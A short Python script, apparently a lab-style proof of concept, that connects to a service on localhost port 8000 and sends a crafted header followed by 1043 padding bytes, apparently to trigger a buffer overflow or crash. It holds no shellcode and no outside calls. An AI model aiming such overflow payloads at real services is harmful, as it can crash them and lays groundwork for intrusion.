#!/usr/bin/python

import os, socket

HOST = '127.0.0.1'
PORT = 8000

def get_payload():
    return chr(0)*2 + chr(4) + chr(20) + 'a'*(1043)
     

def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()